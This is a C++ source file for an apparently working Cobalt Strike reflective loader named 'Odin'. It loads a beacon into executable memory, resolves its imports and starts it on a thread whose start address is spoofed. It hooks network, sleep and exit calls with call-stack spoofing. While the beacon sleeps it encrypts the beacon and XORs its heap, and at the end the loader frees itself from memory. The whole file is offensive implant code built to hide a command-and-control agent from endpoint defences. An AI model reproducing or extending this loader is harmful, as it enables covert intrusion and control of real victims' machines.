/* ------------------------------------------ -
    ShellcodeTemplate by DallasFR

    Visual Studio Template to easly made shellcode.

    Feature :
    - All API Call is dynamicly solved with API Hashing (djb2), easy to edit with compile time hashing
    - You can use variable, the .rdata section is merged at the end of .text section, easy to use with macro
    - Implementation of printf for easy debugging

------------------------------------------- */

#include <Windows.h>

#include "ntdll.h"
#include "hash.h"
#include "api.h"
#include "macro.h"
#include "instance.h"
#include "reflective.h"
#include "spoof.h"
#include "k32.h"
#include "hook.h"

/*

main.cpp            $a  --> Main function
api.cpp             $b  --> xGetProcAddr, xGetModuleAddr, FindBeacon, _memcpy, _strlenA, GetLoaderInfo
hash.cpp            $c  --> Hash function
string              $d  --> String with MACRO_STR, use this for debug with dbgprint
reflective.cpp      $d  --> CopyPESections, ResolveImports, ProcessRelocation
spoof.cpp           $e  --> Callstack crafting stuff
k32.cpp             $f  --> XloadLibraryA, xLdrGetProcedureAddress, xAllocAddr, xHeapCreate
delete.cpp          $g  --> deleted
hook.cpp            $e  --> All hooked function
odin.cpp            $f  --> deleted
sleep.cpp           $g  --> Sleep_kraken

    Execution of loader :

1 - Create heap for beacon usage
2 - Allocation of RWX area with beacon size + UDRL size
3 - Copy the UDRL at the end of beacon in allocated area
    | 0x00 | beacon | 0xBEACON_SIZE | UDRL | 0xEND_Alloc
4 - Copy the ODIN structure (heap handle, beacon addr, alloc size) to the start of allocated area (no pe header is present)
5 - Copy beacon section
6 - Resolve beacon import and patch IAT (also set hook)
7 - Patch relocation table
8 - Init the beacon
9 - Create thread on TpReleaseCleanupGroupMembers+0x450 to spoof the thread start addr & beacon run
10 - Self delete the loader

    Beacon run :

- All WININET function is hooked and use callstack crafting
- Sleep is hooked :
    1 - XOR the heap (random key for each sleep)
    2 - Encrypt the beacon + udrl (remember he was copied at the end of beacon) with KrakenMask (ropchain, rwx->rw, encrypt, sleep, rw->rwx)
    3 - XOR the heap 

- ExitThread is hooked :
    1 - Destroy the beacon heap
    2 - Free the memory region with the beacon 
    3 - Exit thread

CREDIT :

For code :

- Callstack craffting : https://github.com/susMdT/LoudSunRun
- Some parts of code : https://www.cobaltstrike.com/product/features/user-defined-reflective-loader

For idea :

- AceLdr : https://github.com/kyleavery/AceLdr
- BokuLdr : https://github.com/boku7/BokuLoader
- KaynStrike : https://github.com/Cracked5pider/KaynStrike

Thanks to :

- chatGPT, Bakki, Caracal & CobaltAD : For debug and somes help

    How to use :

- Compil this and load the cna script (odin.cna)
About the cna, you need to edit path of variable $loader_path at line 11 & 38
*/

typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
typedef ULONG(NTAPI* fnRtlCaptureContext)   (PCONTEXT);
typedef ULONG(NTAPI* fnNtContinue)          (PCONTEXT, BOOL);

#pragma code_seg(".text$a")
int EntryPoint() {

    void* loaderStart = &EntryPoint;

    INSTANCE Inst = { 0 };
    if (!InitInstance(&Inst))
        return EXIT_FAILURE;

    ULONG_PTR rawDllBaseAddress = FindBeacon();

    LOADER_INFO ldrInfo = { 0 };
    ODIN odin = { 0 };
    HOOK_LIST hookList;

    GetLoaderInfo(&ldrInfo, rawDllBaseAddress);
   
    PIMAGE_DOS_HEADER rawDllDosHeader = (PIMAGE_DOS_HEADER)rawDllBaseAddress;
    PIMAGE_NT_HEADERS rawDllNtHeader = (PIMAGE_NT_HEADERS)(rawDllBaseAddress + rawDllDosHeader->e_lfanew);

    odin.hHeap = xHeapCreate(HEAP_NO_SERIALIZE, 0, 0, &Inst);
    odin.stSize = (rawDllNtHeader->OptionalHeader.SizeOfImage + sizeof(ODIN) + PATTERN_SIZE + ldrInfo.dwLoaderSize); // Size of beacon + udrl

    ULONG_PTR uAllocatedAddr = (ULONG_PTR)xAllocAddr(odin.stSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE, &Inst);

    odin.pBeaconAddr = (void*)uAllocatedAddr;

    /*
    Comme on ne copie pas les DOS/NT Hrader du beacon, nous allons avoir 1024 bytes de libre au début de la zone alloué.
    Dans celle-ci on va copier la structure ODIN avec un pattern de 16 bytes aléatoires. Elle contiendra les informations sur le HANDLE de Heap crée en amont et de la zone à chiffrer.
   
    MEM CONTENT :

        0x00 - 0x10 -> PATTERN
        0x10 - 0x20 -> STRUCTURE ODIN
        0x20 - 0x400 -> NULL
        0x400 - BEACON_SIZE -> BEACON
        BEACON_SIZE - ALLOC_SIZE -> UDRL (pour les hooks)
    */

    /* ----------------------------------------
    ON COPIE LE UDRL ET LA STRUCTURE - START
    ---------------------------------------- */

    // Copy UDRL at the end of dll
    _memcpy(
        (void*)(uAllocatedAddr + rawDllNtHeader->OptionalHeader.SizeOfImage),
        ldrInfo.pLoaderAddr,
        ldrInfo.dwLoaderSize
    );
    

    // Copy odin patternss
    _memcpy(
        (void*)uAllocatedAddr,
        odinPattern,
        PATTERN_SIZE
    );


    // Copy odin struct
    _memcpy(
        (void*)(uAllocatedAddr + PATTERN_SIZE),
        &odin,
        sizeof(ODIN)
    );

    /* ----------------------------------------
    ON COPIE LE UDRL ET LA STRUCTURE - END
    ---------------------------------------- */

    // On initialise les hooks

    InitHook(&ldrInfo, &hookList, uAllocatedAddr, rawDllNtHeader->OptionalHeader.SizeOfImage);

    if (!CopyPESections(rawDllBaseAddress, uAllocatedAddr)) { // ok
        return EXIT_FAILURE;
    };

    ResolveImports(rawDllNtHeader, uAllocatedAddr, &Inst, &hookList, &ldrInfo, uAllocatedAddr, rawDllNtHeader->OptionalHeader.SizeOfImage); 

    ProcessRelocations(rawDllNtHeader, uAllocatedAddr);

    ULONG_PTR entryPoint = uAllocatedAddr + rawDllNtHeader->OptionalHeader.AddressOfEntryPoint;

    // beacon init
    ((DLLMAIN)entryPoint)((HINSTANCE)uAllocatedAddr, DLL_PROCESS_ATTACH, NULL);

    // run beacon with spoofed thread
  
    HANDLE hThread = SPOOF_6(Inst.k32.CreateThread, NULL, 0, (void*)(((UINT_PTR)Inst.ntdll.TpReleaseCleanupGroupMembers) + 0x450), NULL, (void*)CREATE_SUSPENDED, NULL);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_ALL;

    SPOOF_2(Inst.k32.GetThreadContext, hThread, &ctx);

    ctx.Rip = entryPoint;
    ctx.Rcx = (DWORD64)loaderStart;
    ctx.Rdx = 4;
    ctx.R8 = 0;

    SPOOF_2(Inst.k32.SetThreadContext, hThread, &ctx);
    SPOOF_1(Inst.k32.ResumeThread, hThread);
    

    // self delete loader
    CONTEXT ctxDeleteLdr;
    ctxDeleteLdr.ContextFlags = CONTEXT_ALL;

    SIZE_T ldrSizeClean = 0;
    PVOID ldrAddrClean = ldrInfo.pLoaderAddr;

    ((fnRtlCaptureContext)Inst.ntdll.RtlCaptureContext)(&ctxDeleteLdr);

    ctxDeleteLdr.Rip = (DWORD64)Inst.k32.VirtualFree;
    ctxDeleteLdr.Rcx = (DWORD64)(HANDLE)-1;
    ctxDeleteLdr.Rdx = (DWORD64) & ldrAddrClean;
    ctxDeleteLdr.R8 = (DWORD64) & ldrSizeClean;
    ctxDeleteLdr.R9 = (DWORD64)MEM_RELEASE;

    *(DWORD64*)(ctxDeleteLdr.Rsp) = (DWORD64)Inst.ntdll.RtlExitUserThread;

    ((fnNtContinue)Inst.ntdll.NtContinue)(&ctxDeleteLdr, FALSE);

	return EXIT_SUCCESS;
}